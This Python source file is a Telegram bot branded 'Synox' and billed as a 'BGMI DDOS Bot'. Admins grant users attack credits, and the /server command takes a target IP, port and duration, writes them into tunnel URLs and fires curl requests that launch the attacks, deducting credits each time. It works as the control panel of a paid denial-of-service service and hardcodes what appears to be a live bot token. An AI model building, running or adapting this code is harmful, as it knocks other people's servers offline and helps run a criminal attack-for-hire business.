import os
import asyncio
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from telegram import Update
from telegram.constants import ChatAction
from telegram.ext import Application, CommandHandler, ContextTypes

TELEGRAM_TOKEN = '8413749825:AAFxF5GDHIqnnPBxljYwYOW_kL-CVE1IOds'  # Synox: Your bot token

ADMIN_IDS = {6444071433, 8477965075}  # Synox: Your admin Telegram user IDs
DATA_FILE = 'synox_user_sessions.json'  # Synox file naming
CREDIT_COST_PER_ATTACK = 25

user_sessions = {}
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'r') as f:
        try:
            user_sessions = json.load(f)
            for session_key, session in user_sessions.items():
                if 'approved' in session and isinstance(session['approved'], list):
                    session['approved'] = set(session['approved'])
        except (json.JSONDecodeError, KeyError) as e:
            print(f"Synox: Data load error, starting fresh: {e}")
            user_sessions = {}

VBV_LOADING_FRAMES = [
    "🟦 [■□□□□]",
    "🟦 [■■□□□]",
    "🟦 [■■■□□]",
    "🟦 [■■■■□]",
    "🟦 [■■■■■]",
]

def save_data():
    to_save = {}
    for k, v in user_sessions.items():
        copy_sess = v.copy()
        if 'approved' in copy_sess and isinstance(copy_sess['approved'], set):
            copy_sess['approved'] = list(copy_sess['approved'])
        to_save[k] = copy_sess
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(to_save, f, indent=4)
    except Exception as e:
        print(f"Synox: Save error: {e}")

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "/start - Show Synox commands\n"
        "/approve <id> <credit> - Approve ID with credit (admin only)\n"
        "/credit <id> <credit> - Add credit to ID (admin only)\n"
        "/remove <id> - Remove ID approval (admin only)\n"
        "/server <ip> <port> <time> - Run Synox attack on approved IDs\n"
        "/status - Show approved IDs and credits\n"
        "Powered by @synox - BGMI DDOS Bot"
    )

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <id> <credit>")
        return
    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    try:
        credit = int(context.args[1])
        if credit <= 0:
            raise ValueError("Positive only")
    except ValueError:
        await update.message.reply_text("Credit must be a positive integer")
        return
    session = user_sessions.get(chat_id, {})
    session.setdefault('credits', {})
    session.setdefault('approved', set())
    session['credits'][id_] = credit
    session['approved'].add(id_)
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Synox Approved ID {id_} with {credit} credits. Attack ready!")

async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /credit <id> <credit>")
        return
    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    try:
        credit = int(context.args[1])
        if credit <= 0:
            raise ValueError("Positive only")
    except ValueError:
        await update.message.reply_text("Credit must be a positive integer")
        return
    session = user_sessions.get(chat_id, {})
    if id_ not in session.get('credits', {}):
        await update.message.reply_text(f"Synox: ID {id_} not approved yet.")
        return
    session['credits'][id_] += credit
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Synox Added {credit} credits to ID {id_}. Total: {session['credits'][id_]}")

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <id>")
        return
    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    session = user_sessions.get(chat_id, {})
    if 'approved' in session and id_ in session['approved']:
        session['approved'].remove(id_)
    if 'credits' in session and id_ in session['credits']:
        del session['credits'][id_]
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Synox Removed ID {id_} approval and credits.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    session = user_sessions.get(chat_id, {})
    approved = session.get('approved', set())
    credits = session.get('credits', {})
    if not approved:
        await update.message.reply_text("Synox: No approved IDs yet.")
        return
    lines = ["Synox Approved IDs and credits:"]
    for id_ in sorted(approved):  # Sorted for consistency
        c = credits.get(id_, 0)
        lines.append(f"ID: {id_} — Credits: {c}")
    lines.append("Managed by @synox")
    await update.message.reply_text("\n".join(lines))

async def run_url_with_subprocess(url: str):
    try:
        proc = await asyncio.create_subprocess_exec(
            'curl', '-s', url,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL
        )
        await proc.communicate()
    except Exception as e:
        print(f"Synox: Curl error: {e}")

async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    session = user_sessions.get(chat_id, {})
    approved_ids = session.get('approved', set())
    credits = dict(session.get('credits', {}))  # Copy to avoid mutation during iter
    if not approved_ids:
        await update.message.reply_text("Synox: No approved IDs. Use /approve first.")
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /server <ip> <port> <time>")
        return
    ip, port, time_s = context.args
    try:
        time_int = int(time_s)
        if time_int <= 0:
            raise ValueError("Positive time")
        int(port)  # Validate port
    except ValueError:
        await update.message.reply_text("Port and time must be positive integers")
        return
   
    try:
        with open("synox_tunnel_url.txt", "r") as f:  # Synox file naming
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        await update.message.reply_text("Synox: synox_tunnel_url.txt not found. Run synox.py first.")
        return
    except Exception as e:
        await update.message.reply_text(f"Synox: Load error: {e}")
        return
    
    updated_urls = []
    for url in urls:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query['ip'] = [ip]
        query['port'] = [port]
        query['duration'] = [str(time_int)]
        new_query = urlencode(query, doseq=True)
        new_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment
        ))
        updated_urls.append(new_url)
    
    tasks = []
    low_credit_ids = []
    for id_ in list(approved_ids):
        credit = credits.get(id_, 0)
        if credit < CREDIT_COST_PER_ATTACK:
            low_credit_ids.append(id_)
            continue
        credits[id_] = credit - CREDIT_COST_PER_ATTACK
        for url in updated_urls:
            tasks.append(run_url_with_subprocess(url))
    
    if low_credit_ids:
        await update.message.reply_text(f"Synox: IDs {', '.join(low_credit_ids)} low credit. Need {CREDIT_COST_PER_ATTACK} each.")
    
    if not tasks:
        await update.message.reply_text("Synox: No sufficient credits for attack.")
        return
    
    user_sessions[chat_id]['credits'] = credits
    save_data()
    
    await context.bot.send_chat_action(chat_id=int(chat_id), action=ChatAction.TYPING)
    msg = await update.message.reply_text(VBV_LOADING_FRAMES[0] + " 0% - Synox Attack Loading")
    frame_count = len(VBV_LOADING_FRAMES)
    for i, frame in enumerate(VBV_LOADING_FRAMES):
        percentage = int(((i + 1) / frame_count) * 100)
        display_message = f"{frame}  {percentage}% - @synox"
        await asyncio.sleep(1)
        try:
            await msg.edit_text(display_message)
        except Exception:
            pass  # Edit fail silent
    
    await asyncio.gather(*tasks, return_exceptions=True)
    try:
        await msg.edit_text("✅ Synox Attack successful! Powered by @synox - BGMI Down!")
    except Exception:
        pass

def main():
    if not TELEGRAM_TOKEN or TELEGRAM_TOKEN == '8413749825:AAFxF5GDHIqnnPBxljYwYOW_kL-CVE1IOds':
        print("Synox: Token ready!")
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("credit", add_credit))
    app.add_handler(CommandHandler("remove", remove))
    app.add_handler(CommandHandler("server", server))
    app.add_handler(CommandHandler("status", status))
    print("Synox Bot starting...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
